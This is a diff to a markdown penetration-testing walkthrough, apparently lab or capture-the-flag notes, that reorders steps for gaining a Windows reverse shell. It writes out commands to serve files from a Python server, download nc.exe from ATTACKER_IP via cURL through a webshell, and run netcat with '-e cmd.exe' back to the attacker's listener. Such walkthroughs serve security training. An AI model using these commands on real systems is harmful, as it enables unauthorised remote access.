@@ -73,7 +73,13 @@ Instead we'll stick with trusty old cURL.
 
 ## cURL
 
-From #Webshell  use cURL to upload your new copy of netcat to the target:
+#Attacking_Machine 
+Open a python server.
+
+`sudo python3 -m http.server 80`
+
+#Webshell 
+Use cURL to upload your new copy of netcat to the target:
 
 `curl http://ATTACKER_IP/nc.exe/nc64.exe -o c:\\windows\\tasks\\nc-USERNAME.exe   `
 
@@ -85,10 +91,13 @@ From #Webshell  use cURL to upload your new copy of netcat to the target:
 
 We now have everything we need to get a reverse shell back from this target.
 
-Set up a netcat listener on your #Attacking_Machine 
+#Attacking_Machine 
+Set up a netcat listener.
+
 `sudo nc -lvnp 443`
 
-In your #webshell, use the following command:
+ #Webshell 
+ Use the following command:
 
 `powershell.exe c:\\windows\\task\\nc-USERNAME.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe   `
 
